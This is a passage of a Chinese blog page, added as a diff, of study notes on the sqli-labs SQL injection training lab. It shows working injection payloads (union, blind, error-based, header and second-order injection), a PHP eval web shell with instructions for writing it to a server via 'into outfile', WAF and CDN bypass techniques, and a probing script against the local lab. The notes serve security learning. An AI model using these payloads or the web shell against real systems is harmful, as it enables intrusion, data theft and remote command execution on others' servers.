@@ -1,0 +1,241 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="SQL注入-sqlilabs"><meta name="keywords" content="Web"><meta name="author" content="Second_BC,undefined"><meta name="copyright" content="Second_BC"><title>SQL注入-sqlilabs【Second_BC の BloG】</title><link rel="stylesheet" href="/SecondBC/css/fan.css"><link rel="stylesheet" href="/SecondBC/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/SecondBC/favicon.ico"><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/SecondBC/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
+    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
+});
+</script><script>var isPassword = '' || false;
+if (isPassword) {
+    if (prompt('请输入文章密码') !== '') {
+        alert('密码错误！');
+        history.back();
+    }
+}</script><script>window.GLOBAL_CONFIG = {
+  root: '/SecondBC/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  gitment: ,
+  valine: ,
+}</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/SecondBC/atom.xml" title="Second_BC の BloG" type="application/atom+xml">
+</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#less01-less04"><span class="toc-number">1.</span> <span class="toc-text">less01~less04</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4-%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">解题一般步骤&#x2F;思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#group-concat"><span class="toc-number">1.2.</span> <span class="toc-text">group_concat()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#concat-ws"><span class="toc-number">1.3.</span> <span class="toc-text">concat_ws()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less05-less06"><span class="toc-number">2.</span> <span class="toc-text">less05~less06</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.1.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#left"><span class="toc-number">2.1.1.</span> <span class="toc-text">left()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#substr"><span class="toc-number">2.1.2.</span> <span class="toc-text">substr()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ascii"><span class="toc-number">2.1.3.</span> <span class="toc-text">ascii()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less07"><span class="toc-number">3.</span> <span class="toc-text">less07</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.1.</span> <span class="toc-text">一句话木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#into-outfile"><span class="toc-number">3.2.</span> <span class="toc-text">into outfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#load-file"><span class="toc-number">3.3.</span> <span class="toc-text">load_file()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less08-less10"><span class="toc-number">4.</span> <span class="toc-text">less08~less10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#if"><span class="toc-number">4.1.</span> <span class="toc-text">if()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.2.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less11-less16"><span class="toc-number">5.</span> <span class="toc-text">less11~less16</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POST%E6%B3%A8%E5%85%A5"><span class="toc-number">5.1.</span> <span class="toc-text">POST注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less17"><span class="toc-number">6.</span> <span class="toc-text">less17</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">6.1.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml"><span class="toc-number">6.1.1.</span> <span class="toc-text">updatexml()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue"><span class="toc-number">6.1.2.</span> <span class="toc-text">extractvalue()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less18-less22"><span class="toc-number">7.</span> <span class="toc-text">less18~less22</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#http%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">7.1.</span> <span class="toc-text">http头注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less23"><span class="toc-number">8.</span> <span class="toc-text">less23</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F"><span class="toc-number">8.1.</span> <span class="toc-text">SQL语句执行顺序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less24"><span class="toc-number">9.</span> <span class="toc-text">less24</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">9.1.</span> <span class="toc-text">二次注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less25-less25a"><span class="toc-number">10.</span> <span class="toc-text">less25~less25a</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF%E7%BB%95%E8%BF%87"><span class="toc-number">10.1.</span> <span class="toc-text">WAF绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less26-less28a"><span class="toc-number">11.</span> <span class="toc-text">less26~less28a</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E8%8E%B7%E5%8F%96%E7%A9%BA%E6%A0%BC%E7%AC%A6%E6%9B%BF%E6%8D%A2%E5%AF%B9%E5%BA%94%E7%9A%84url%E7%BC%96%E7%A0%81"><span class="toc-number">11.1.</span> <span class="toc-text">脚本获取空格符替换对应的url编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less29-less31"><span class="toc-number">12.</span> <span class="toc-text">less29~less31</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%A4%E5%B1%82%E6%9E%B6%E6%9E%84"><span class="toc-number">12.1.</span> <span class="toc-text">服务器两层架构</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less32-less37"><span class="toc-number">13.</span> <span class="toc-text">less32~less37</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">13.1.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#addslashes-mysql-real-escape-string"><span class="toc-number">13.2.</span> <span class="toc-text">addslashes() &#x2F; mysql_real_escape_string()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less38-less45"><span class="toc-number">14.</span> <span class="toc-text">less38~less45</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">14.1.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">14.2.</span> <span class="toc-text">使用堆叠注入写一句话木马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less46-less53"><span class="toc-number">15.</span> <span class="toc-text">less46~less53</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lines-terminated-by-123"><span class="toc-number">15.1.</span> <span class="toc-text">lines terminated by 123</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysqli-multi-query"><span class="toc-number">15.2.</span> <span class="toc-text">mysqli_multi_query()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less54-less75"><span class="toc-number">16.</span> <span class="toc-text">less54~less75</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">17.</span> <span class="toc-text">补充</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/SecondBC/ss.jpg"></div><div class="author-info-name">Second_BC</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/" target="_blank">GitHub<i class="icon-dot bg-color1"></i></a><a class="links-button button-hover" href="mailto:1" target="_blank">E-Mail<i class="icon-dot bg-color6"></i></a><a class="links-button button-hover" href="tencent://message/?uin=2&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color3"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/SecondBC/archives"><span class="pull-top">日志</span><span class="pull-bottom">34</span></a><a class="author-info-articles-tags article-meta" href="/SecondBC/tags"><span class="pull-top">标签</span><span class="pull-bottom">10</span></a><a class="author-info-articles-categories article-meta" href="/SecondBC/categories"><span class="pull-top">分类</span><span class="pull-bottom">3</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/SecondBC">首页</a><a class="menu-item" href="/SecondBC/archives">归档</a><a class="menu-item" href="/SecondBC/categories">分类</a><a class="menu-item" href="/SecondBC/tags">标签</a><a class="menu-item" href="/SecondBC/about">关于</a></nav><div class="right-info"><a class="title-name" href="/SecondBC/">Second_BC の BloG</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">SQL注入-sqlilabs</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2024-02-26 | 更新于 2024-02-26</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Lab/">Lab</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Web/">Web</a></div></div></div><div class="main-content"><p>本篇根据sqli-labs展开而来笔记，基于mysql，php的环境；</p>
+<p>前置知识：SQL语法，在SQL学习日记中有讲述；</p>
+<h2 id="less01-less04"><a href="#less01-less04" class="headerlink" title="less01~less04"></a>less01~less04</h2><h3 id="解题一般步骤-思路"><a href="#解题一般步骤-思路" class="headerlink" title="解题一般步骤/思路"></a>解题一般步骤/思路</h3><ol>
+<li>判断是否可注入（单引号/双引号/括号报错）</li>
+<li>判断字段数，使用order by n；<ul>
+<li>order by n 的含义是按照第n个字段排序；</li>
+</ul>
+</li>
+<li>确定回显字段，使用 union select 1,2,…,n;<ul>
+<li>联合查找将前面的select联系起来，select 常数 的含义是给查询结果一个临时的列，这个列所有行都是这个常数，一共有表内对象个的行数；</li>
+<li>在使用时，往往回显只显示第一行（联合查找前半段），需要将第一行的内容屏蔽掉，如limit，或者使第一行等于一个非法值；</li>
+</ul>
+</li>
+<li>利用回显的字段查询出数据库，表，字段，以及需要的所有数据；</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata  		#找库</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#x27;</span>		#从库找表</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.colunms <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;&#x27;</span>		#从表找字段</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> xxx.xxx					#找数据</span><br></pre></td></tr></table></figure>
+
+<p>在找数据时，经常用到以下两个函数：</p>
+<h3 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h3><ul>
+<li>使此函数括号内的查询结果拼成一行，如图；</li>
+</ul>
+<p><img src="https://s2.loli.net/2023/10/16/LdE7GvQUlF1cApX.png" alt="group_concat()"></p>
+<h3 id="concat-ws"><a href="#concat-ws" class="headerlink" title="concat_ws()"></a>concat_ws()</h3><ul>
+<li>此函数有三个参数，第一个为拼接符，后两个为拼接字段，输出为两个字段的拼接态，如图;</li>
+</ul>
+<p><img src="https://s2.loli.net/2023/10/16/8ibBxTZWR9gsXIU.png" alt="concat_ws"></p>
+<p>为什么需要使用这两个函数？正如前面所述，回显一般只显示查询的第一行，需要将查到的账号密码拼接而且合并为一行输出，这样才能在回显上观察到需要的全貌；</p>
+<h2 id="less05-less06"><a href="#less05-less06" class="headerlink" title="less05~less06"></a>less05~less06</h2><p>此类型为：</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>回显只会显示查询结果正确或是错误，不会回显出查询的内容；</p>
+<p>使用以下函数以进行对字符串的操作：</p>
+<h4 id="left"><a href="#left" class="headerlink" title="left()"></a>left()</h4><p>其中有两个参数，第一个为字符串，第二个为长度，作用为从左截取长度个字符串内的字符；</p>
+<p>例如以下内容：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">left</span>(database(),<span class="number">4</span>);				#截取当前数据库名的前<span class="number">4</span>个字符</span><br></pre></td></tr></table></figure>
+
+<p>由此可以对截取内容进行比较：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>;			#正确返回<span class="number">1</span>，错误返回<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>由此来使得获取库名的目的；</p>
+<h4 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h4><p>三个参数，第一个为字符串，第二个为起始位置，第三个为截取长度，例如substr(a,b,c)，作用为截取a字符串，从b位置开始，截取c位长度；</p>
+<h4 id="ascii"><a href="#ascii" class="headerlink" title="ascii()"></a>ascii()</h4><p>将输入的字符转为其ascii值；</p>
+<p>使用以上函数便可完成对字符的判断，从而得到库名，一般不会直接使用等于多少多少字符，而是每个字符转为ascii后采用二分法判断其是哪个字符；</p>
+<p>当然也可用BP抓包，暴力破解，具体步骤为抓包-&gt;转发测试器(Intruder)-&gt;添加变量位置-&gt;选择暴力破解-&gt;规定字符集以及长度-&gt;选择进程数-&gt;开始；</p>
+<p>测出的发包观察其长度变化，找到独异个体，查看其响应包内是否为正确回显即可；</p>
+<p>之后便根据此方法依次判断库名，表名，字段名，以及账号密码；</p>
+<h2 id="less07"><a href="#less07" class="headerlink" title="less07"></a>less07</h2><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>由于才疏识浅，能找到的内容如下，会有不严谨和错误的地方：</p>
+<p>php版本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上传到目的网址后，使用中国菜刀打开其路径并加上pass变量，即可查看其所有数据；</p>
+<p>其含义为 <code>&lt;?php ?&gt;</code> 是html将此包裹里的内容作为php语句执行；</p>
+<p>艾特符号取消报错，eval函数将输入的字符串作为命令执行；</p>
+<p>$_POST变量是全局的php变量，也是一个数组，括号内的pass则是其下标，对应pass变量，译作将post发送的内容转给pass变量；</p>
+<p>整句话的意思是：将post的内容作为指令在服务器上执行；</p>
+<p>中国菜刀的原理简单理解为窗口化的post输入指令，每点一下都是在对服务器post指令；</p>
+<h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><p>写文件关键字，用法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a,b,c <span class="keyword">into</span> outfile <span class="string">&#x27;path\\1.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h3><p>读文件，直接跟在select后面作为查询内容，参数为文件路径；</p>
+<p>解法也如同之前所述，先判断注入点，之后用 into outfile 将一句话木马作为字符串写入目标文件内，之后便可用中国菜刀访问web shell；</p>
+<h2 id="less08-less10"><a href="#less08-less10" class="headerlink" title="less08~less10"></a>less08~less10</h2><h3 id="if"><a href="#if" class="headerlink" title="if()"></a>if()</h3><p>类似三目运算，三个参数，第一个为条件，第二个为真时返回值，第三个为假时返回值；</p>
+<p>if函数一般与sleep函数一起使用，sleep函数的参数单位为秒，构成时间盲注的句子；</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>当回显内容为空时，此时可以采用时间盲注的方法；</p>
+<p>回显为空时如何判断注入漏洞？在可能出现漏洞的地方加入sleep函数来测试，是否响应时间变动；</p>
+<p>布尔盲注是根据回显判断内容是否正确，那么时间盲注即是根据响应时间来判断是否正确，如下面一段话：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if(length(database())<span class="operator">=</span><span class="number">7</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))</span><br></pre></td></tr></table></figure>
+
+<p>当前数据库名长度为7时返回1，否则睡眠5秒，在where中加入此条件的话，会导致判断时网页的响应时间发生变化，由此进行判断；</p>
+<p>由此方法与布尔盲注类似，不断去判断库名，表名，字段名，拿到数据；</p>
+<p>也可以用sqlmap脚本自动爆破，以及bp；</p>
+<p>此方法的开销较大，一般不选用；</p>
+<h2 id="less11-less16"><a href="#less11-less16" class="headerlink" title="less11~less16"></a>less11~less16</h2><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><p>比起get注入，需要注意的点为参数名称需要用bp抓包来获取，之后使用hackbar的post方法发包，且注释符需要使用 # ，–+ 一般用于url中；</p>
+<p>获取到注入点也同之前一样，之后，可使用 or 1=1 来永真返回；</p>
+<p>查找表和数据的步骤如之前一样进行；</p>
+<p>盲注步骤也一样；</p>
+<h2 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>核心函数：</p>
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p>三个参数，第一个为XML文档对象的名称，第二个为Xpath格式的字符串，第三个为替换数据；</p>
+<p>作用为改变文档中符合条件的节点；</p>
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>两个参数，用法同上函数，第一个参数为对象名，第二个为Xpath格式的字符串；</p>
+<p>而在报错注入中，concat函数返回的类型时一个字符串，不符合xpath的格式，所以会报错，并给出这个字符串的内容，从而获取信息；</p>
+<p>如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>会导致其报错而显示database的内容：</p>
+<p><img src="https://s2.loli.net/2023/10/19/ldjkMuKAaqteV3x.png" alt="xpath error"></p>
+<p>这个方法有什么用？ </p>
+<p>高效：对于无回显可以这么用，直接拿名称；</p>
+<p>防止过滤关键词，比如不让用union select了怎么查呢？</p>
+<h2 id="less18-less22"><a href="#less18-less22" class="headerlink" title="less18~less22"></a>less18~less22</h2><h3 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h3><p>当发包信息参与了sql语句时，可以利用http头进行注入（如回显有这些内容时，可以猜测）；</p>
+<p>一般是将useragent，或者ip，或者等等的头信息作为参数加入sql语言中；</p>
+<p>思路是使用bp重构这些参数，使其在sql语句中时产生注入漏洞；</p>
+<p>注意：不要打乱这些参数序列！！！（<strong>构造闭合</strong>）</p>
+<p>cookie注入如法炮制，cookie的发包一般在原包的后面一个包，里面包含了cookie字段；</p>
+<p>对于base64编码的内容，也需要将构造的payload进行base64编码然后发包;</p>
+<p>例如：</p>
+<p>18关登录成功的情况下是会回显useragent的：</p>
+<p><img src="https://s2.loli.net/2023/10/19/KpeqE9VPILt5oxb.png" alt="feedback"></p>
+<p>利用bp的重发器，在useragent的地方使用单引号判断出有注入漏洞，则可在这个位置进行payload构造：</p>
+<p><img src="https://s2.loli.net/2023/10/19/lOyI3ozBK4kQsAZ.png" alt="repeat"></p>
+<p>注意根据语法错误构造闭合：</p>
+<p>原内容为注入点后面还有两个字符串，并且有个括号，那么构造payload应该为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; payload,&#x27;&#x27;,&#x27;&#x27;) #</span></span><br><span class="line"><span class="string">或者</span></span><br><span class="line"><span class="string">&#x27;</span> payload <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>之后如法炮制拿数据；</p>
+<p>至此，基础篇结束；</p>
+<h2 id="less23"><a href="#less23" class="headerlink" title="less23"></a>less23</h2><p>当 –+ 或者 # 被注释掉时，可以试用如下内容：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="operator">%</span><span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<p>我的理解是单引号分割语句，%00为url编码中的空字符对后面的内容进行截断，导致sql语言能正常执行；</p>
+<p>也可以构造常规语句来闭合引号；</p>
+<h3 id="SQL语句执行顺序"><a href="#SQL语句执行顺序" class="headerlink" title="SQL语句执行顺序"></a>SQL语句执行顺序</h3><p>在where附加条件时，如果order by 后面还有跟 and or 一类的连接符，order by 会被忽略掉；</p>
+<h2 id="less24"><a href="#less24" class="headerlink" title="less24"></a>less24</h2><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>注入时，特殊字符被转义无法导致注入，只有将转义后的内容存入数据库，之后引用这个数据时发生注入漏洞，称二次注入；</p>
+<p>例子：在注册用户时，给已有用户名后面加 ‘# 符号，致使 user’#被创建，在修改密码时，引用字符应为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users <span class="keyword">SET</span> password<span class="operator">=</span><span class="string">&#x27;sss&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;user&#x27;</span>#<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时发生注入漏洞，并将原本的user账户的密码修改了；</p>
+<h2 id="less25-less25a"><a href="#less25-less25a" class="headerlink" title="less25~less25a"></a>less25~less25a</h2><h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><p>可分为三类：</p>
+<ul>
+<li><p>白盒绕过</p>
+<ul>
+<li>通过获取源码分析的方式进行绕过；</li>
+</ul>
+</li>
+<li><p>黑盒绕过</p>
+<ul>
+<li><p>架构层面</p>
+<p>​    寻找原网站绕过：针对云WAF，云waf的作用类似于拦截网，先通过其进行验证，之后将数据交给原网址，类似CDN；</p>
+<p>​    对于CDN：通过超级ping，在不同地区的CDN返回ping值不同的结果；</p>
+<p>​            注册，直接转到原网站；</p>
+<p>​            通过国外IP地址访问，对于个别网站CDN只针对于国内；</p>
+<p>​    通过同网段绕过：一个网段中，经过的数据可能不会经过云WAF，可以先拿到网段中其他主机的权限，对目标交互；</p>
+<p>​    对于网段解释：192.168.1.0 ~ 192.168.1.255称为一段 （局域网概念）</p>
+</li>
+<li><p>资源限制角度</p>
+<p>​    一般WAF执行需要优先考虑业务优先原则，对于构造超大的数据包可能不会进行检测，实现绕过；</p>
+</li>
+<li><p>协议层面</p>
+<p>​    get型比post型要小，由于业务需求，只对get检测，可通过在post内构造图片后面跟注入语句的方式进行测试；</p>
+<p>​    参数污染：<code>index?id=1&amp;id=2</code> 可能只对id=1进行检测;</p>
+</li>
+<li><p>规则层面</p>
+<p>​    sql注释符绕过：当不允许使用空格，用/**/来代替空格，或者在注释内添加超长内容；</p>
+<p>​                 使用内联注释（mysql特有） <code>/*!union select */</code> 注释内的代码可执行；</p>
+<p>​                 也可以用括号将关键字分割开；</p>
+<p>​    空白符绕过：   对于空格的填充，url编码；</p>
+<p>​                 mysql空白符：%09; %0A; %0B; %0D; %20; %0C; %A0;</p>
+<p>​                 正则空白符：%09; %0A; %0B; %0D; %20;</p>
+<p>​                 %25编码为%，%25A0则是空白符；</p>
+<p>​    函数分隔符号:  将一个函数进行分割，在函数名称后面跟空白符；</p>
+<p>​    浮点数词法解释：WAF对id=1可以检测，但对于id=1.0、id=\N、id=1E0可能无法检测；</p>
+<p>​    利用error-based进行sql注入；</p>
+<p>​    mysql特殊语法：例如 select {x name} from {x table}；</p>
+<p>​    大小写绕过：   如果对 and or union 关键字过滤，可以采用大小写混用的方法，也可使用双写；</p>
+<p>​                 在过滤大小写混用时，采用OORr的写法，会被过滤为or（中间or消失），则是双写，也可以尝试关键词替换；</p>
+</li>
+</ul>
+</li>
+<li><p>fuzz测试</p>
+<ul>
+<li>使用bp测试，测试成功用脚本处理；</li>
+</ul>
+</li>
+</ul>
+<p>使用报错注入过滤空格可用 ^ 来连接函数，针对and or全面封锁;</p>
+<h2 id="less26-less28a"><a href="#less26-less28a" class="headerlink" title="less26~less28a"></a>less26~less28a</h2><p>本题通关方式与25大差不差，原理也和WAF绕过有关；</p>
+<h3 id="脚本获取空格符替换对应的url编码"><a href="#脚本获取空格符替换对应的url编码" class="headerlink" title="脚本获取空格符替换对应的url编码"></a>脚本获取空格符替换对应的url编码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#循环查找编码</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    code = <span class="built_in">hex</span>(i).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(code) &lt; <span class="number">2</span>):</span><br><span class="line">        code = <span class="string">&#x27;0&#x27;</span> + code</span><br><span class="line">    code = <span class="string">&#x27;%&#x27;</span> + code</span><br><span class="line">    <span class="comment">#构造发送url</span></span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-26/?id=1&#x27;&quot;</span> + code + <span class="string">&quot;%26%26&quot;</span> + code + <span class="string">&quot;&#x27;1&#x27;=1&#x27;&quot;</span></span><br><span class="line">    <span 